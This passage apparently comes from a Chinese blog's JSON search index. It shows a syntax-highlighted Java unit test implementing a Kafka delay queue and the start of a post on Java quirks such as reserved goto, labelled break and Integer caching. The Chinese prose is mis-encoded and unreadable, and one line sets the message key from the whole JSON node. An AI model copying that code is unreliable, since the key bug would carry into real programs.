style=\"color:#e6db74\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ConsumerConfig.\u003cspan style=\"color:#a6e22e\"\u003eAUTO_OFFSET_RESET_CONFIG\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;earliest\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ConsumerConfig.\u003cspan style=\"color:#a6e22e\"\u003eISOLATION_LEVEL_CONFIG\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;read_committed\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ConsumerConfig.\u003cspan style=\"color:#a6e22e\"\u003eMAX_POLL_INTERVAL_MS_CONFIG\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;5000\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        consumer \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e KafkaConsumer\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026gt;\u003c/span\u003e(props, \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e StringDeserializer(), \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e StringDeserializer());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003e@BeforeEach\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003einitProducer\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Properties props \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Properties();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ProducerConfig.\u003cspan style=\"color:#a6e22e\"\u003eBOOTSTRAP_SERVERS_CONFIG\u003c/span\u003e, servers);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ProducerConfig.\u003cspan style=\"color:#a6e22e\"\u003eVALUE_SERIALIZER_CLASS_CONFIG\u003c/span\u003e, StringSerializer.\u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003egetName\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ProducerConfig.\u003cspan style=\"color:#a6e22e\"\u003eKEY_SERIALIZER_CLASS_CONFIG\u003c/span\u003e, StringSerializer.\u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003egetName\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        producer \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e KafkaProducer\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026gt;\u003c/span\u003e(props);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003e@Test\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etestDelayQueue\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003ethrows\u003c/span\u003e JsonProcessingException, InterruptedException {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        String topic \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;delay-minutes-1\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        List\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eString\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e topics \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Collections.\u003cspan style=\"color:#a6e22e\"\u003esingletonList\u003c/span\u003e(topic);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        consumer.\u003cspan style=\"color:#a6e22e\"\u003esubscribe\u003c/span\u003e(topics);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Timer timer \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Timer();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        timer.\u003cspan style=\"color:#a6e22e\"\u003eschedule\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e TimerTask() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003e@Override\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erun\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003esynchronized\u003c/span\u003e (lock) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    consumer.\u003cspan style=\"color:#a6e22e\"\u003eresume\u003c/span\u003e(consumer.\u003cspan style=\"color:#a6e22e\"\u003epaused\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    lock.\u003cspan style=\"color:#a6e22e\"\u003enotify\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }, 0, 1000);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003esynchronized\u003c/span\u003e (lock) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                ConsumerRecords\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eString, String\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e consumerRecords \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e consumer.\u003cspan style=\"color:#a6e22e\"\u003epoll\u003c/span\u003e(Duration.\u003cspan style=\"color:#a6e22e\"\u003eofMillis\u003c/span\u003e(200));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (consumerRecords.\u003cspan style=\"color:#a6e22e\"\u003eisEmpty\u003c/span\u003e()) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    lock.\u003cspan style=\"color:#a6e22e\"\u003ewait\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eboolean\u003c/span\u003e timed \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (ConsumerRecord\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eString, String\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e consumerRecord : consumerRecords) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e timestamp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e consumerRecord.\u003cspan style=\"color:#a6e22e\"\u003etimestamp\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    TopicPartition topicPartition \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e TopicPartition(consumerRecord.\u003cspan style=\"color:#a6e22e\"\u003etopic\u003c/span\u003e(), consumerRecord.\u003cspan style=\"color:#a6e22e\"\u003epartition\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (timestamp \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e 60 \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e 1000 \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e System.\u003cspan style=\"color:#a6e22e\"\u003ecurrentTimeMillis\u003c/span\u003e()) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        String value \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e consumerRecord.\u003cspan style=\"color:#a6e22e\"\u003evalue\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        ObjectMapper objectMapper \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e ObjectMapper();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        JsonNode jsonNode \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e objectMapper.\u003cspan style=\"color:#a6e22e\"\u003ereadTree\u003c/span\u003e(value);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        JsonNode jsonNodeTopic \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e jsonNode.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;topic\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        String appTopic \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e, appKey \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e, appValue \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (jsonNodeTopic \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            appTopic \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e jsonNodeTopic.\u003cspan style=\"color:#a6e22e\"\u003easText\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (appTopic \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        JsonNode jsonNodeKey \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e jsonNode.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;key\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (jsonNodeKey \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            appKey \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e jsonNode.\u003cspan style=\"color:#a6e22e\"\u003easText\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        JsonNode jsonNodeValue \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e jsonNode.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;value\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (jsonNodeValue \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            appValue \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e jsonNodeValue.\u003cspan style=\"color:#a6e22e\"\u003easText\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#75715e\"\u003e// send to application topic\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        ProducerRecord\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eString, String\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e producerRecord \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e ProducerRecord\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026gt;\u003c/span\u003e(appTopic, appKey, appValue);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            producer.\u003cspan style=\"color:#a6e22e\"\u003esend\u003c/span\u003e(producerRecord).\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            \u003cspan style=\"color:#75715e\"\u003e// success. commit message\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            OffsetAndMetadata offsetAndMetadata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e OffsetAndMetadata(consumerRecord.\u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e 1);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            HashMap\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eTopicPartition, OffsetAndMetadata\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e metadataHashMap \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e HashMap\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026gt;\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            metadataHashMap.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(topicPartition, offsetAndMetadata);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            consumer.\u003cspan style=\"color:#a6e22e\"\u003ecommitSync\u003c/span\u003e(metadataHashMap);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (ExecutionException e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            consumer.\u003cspan style=\"color:#a6e22e\"\u003epause\u003c/span\u003e(Collections.\u003cspan style=\"color:#a6e22e\"\u003esingletonList\u003c/span\u003e(topicPartition));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            consumer.\u003cspan style=\"color:#a6e22e\"\u003eseek\u003c/span\u003e(topicPartition, consumerRecord.\u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            timed \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        consumer.\u003cspan style=\"color:#a6e22e\"\u003epause\u003c/span\u003e(Collections.\u003cspan style=\"color:#a6e22e\"\u003esingletonList\u003c/span\u003e(topicPartition));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        consumer.\u003cspan style=\"color:#a6e22e\"\u003eseek\u003c/span\u003e(topicPartition, consumerRecord.\u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        timed \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (timed) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    lock.\u003cspan style=\"color:#a6e22e\"\u003ewait\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        } \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003eexit);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ®µç¨‹åºæ˜¯åŸºäºSpringBoot \u003ccode\u003e2.4.4\u003c/code\u003eç‰ˆæœ¬å’Œ kafka-client \u003ccode\u003e2.7.0\u003c/code\u003eç‰ˆæœ¬ç¼–å†™çš„ä¸€ä¸ªå•å…ƒæµ‹è¯•ï¼Œéœ€è¦ä¿®æ”¹ç§æœ‰å˜é‡\u003ccode\u003eservers\u003c/code\u003eä¸ºkafka brokerçš„åœ°å€ã€‚\u003c/p\u003e","title":"åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—"},{"content":"Javaæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—æœºç¼–ç¨‹è¯­è¨€ã€é¢å‘å¯¹è±¡ã€æ³›å‹ç¼–ç¨‹çš„ç‰¹æ€§ï¼Œå¹¿æ³›åº”ç”¨äºä¼ä¸šçº§Webåº”ç”¨å¼€å‘å’Œç§»åŠ¨åº”ç”¨å¼€å‘ã€‚\n1995å¹´3æœˆ23æ—¥Sunå…¬å¸å‘å¸ƒäº†Javaï¼Œè‡³ä»Šå·²æœ‰è¿‘26å¹´ï¼Œå¯ä»¥è¯´æ˜¯ä¸€é—¨ååˆ†æˆç†Ÿçš„å¼€å‘è¯­è¨€äº†ï¼Œä½†åœ¨æŸäº›ä¸ä¸ºäººçŸ¥çš„åœ°æ–¹å­˜åœ¨ç€ä¸€äº›æ„æ–™ä¹‹å¤–çš„ç‰¹æ€§ã€‚\nJavaçš„ä¿ç•™å…³é”®å­— gotoå’Œconst åœ¨Javaé‡Œé¢æ²¡æœ‰gotoè¿™ä¸ªåŠŸèƒ½ï¼Œä½†å®ƒä½œä¸ºä¿ç•™å­—æ˜¯æ— æ³•å½“åšå˜é‡æ¥ä½¿ç”¨çš„ï¼Œconstä¹Ÿæ˜¯åŒæ ·ã€‚\nint goto = 0; int const = 0; ä¸Šé¢è¿™ä¸¤è¡Œä»£ç çš„å†™æ³•å­˜åœ¨é—®é¢˜ï¼Œæ— æ³•æ­£å¸¸ç¼–è¯‘é€šè¿‡ã€‚\nJavaæ ‡ç­¾Label ä¸Šé¢è¯´äº†åœ¨Javaé‡Œé¢æ²¡æœ‰gotoè¿™ä¸ªåŠŸèƒ½ï¼Œä½†ä¸ºäº†å¤„ç†å¤šé‡å¾ªç¯å¼•å…¥äº†Labelï¼Œç›®çš„æ˜¯ä¸ºäº†åœ¨å¤šé‡å¾ªç¯ä¸­æ–¹ä¾¿çš„ä½¿ç”¨ break å’Œcoutinue ï¼Œä½†å¥½åƒåœ¨å…¶ä»–åœ°æ–¹ä¹Ÿå¯ä»¥ç”¨ã€‚\nouterLoop: while (true) { System.out.println(\u0026#34;I\u0026#39;m the outer loop\u0026#34;); int i = 0; while (true) { System.out.println(\u0026#34;I am the inner loop\u0026#34;); i++; if (i \u0026gt;= 3) { break outerLoop; } } } System.out.println(\u0026#34;Complete the loop\u0026#34;); // è¾“å‡º I\u0026#39;m the outer loop I am the inner loop I am the inner loop I am the inner loop Complete the loop test: { System.out.println(\u0026#34;hello\u0026#34;); if (true) { break test; // works } System.out.println(\u0026#34;world\u0026#34;); } // è¾“å‡º hello test: if (true) { System.out.println(\u0026#34;hello\u0026#34;); if (true) { break test; // works } System.out.println(\u0026#34;world\u0026#34;); } // è¾“å‡º hello test: try { System.out.println(\u0026#34;hello\u0026#34;); if (true) { break test; // works } System.out.println(\u0026#34;world\u0026#34;); } finally { } // è¾“å‡º hello Integerçš„æ˜¯å¦ç›¸ç­‰é—®é¢˜ æ—¥å¸¸å¼€å‘ä½¿ç”¨åˆ°JavaåŸºæœ¬æ•°æ®ç±»å‹æ˜¯ä¸å¯é¿å…çš„ä¸€ä»¶äº‹ï¼Œä½†å®ƒå´åŒ…å«äº†ä¸€äº›å¾ˆå®¹æ˜“çŠ¯é”™çš„ç‚¹ï¼Œè¸©è¿‡ä¸€äº›å‘çš„åŒå­¦å¯èƒ½äº†è§£JavaåŸºæœ¬åŒ…è£…ç±»å‹çš„å¸¸é‡æ± æŠ€æœ¯ï¼Œä¾‹å¦‚Integerå°±å…·æœ‰æ•°å€¼[-128ï¼Œ127] çš„ç›¸åº”ç±»å‹çš„ç¼“å­˜æ•°æ®ï¼Œä½†ä¸‹é¢å®šä¹‰çš„4ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰ä½ æ˜¯å¦èƒ½è¯´çš„å‡ºæ¥å‘¢ï¼Ÿ\nInteger i1 = 127; Integer i2 = Integer.valueOf(127); Integer i3 = Integer.parseInt(\u0026#34;127\u0026#34;); Integer i4 = new Integer(127); System.out.println(i1 == i2); // true System.out.println(i1 == i3); // true System.out.println(i2 == i3); // true System.out.println(i4 == i1); // false System.out.println(i4 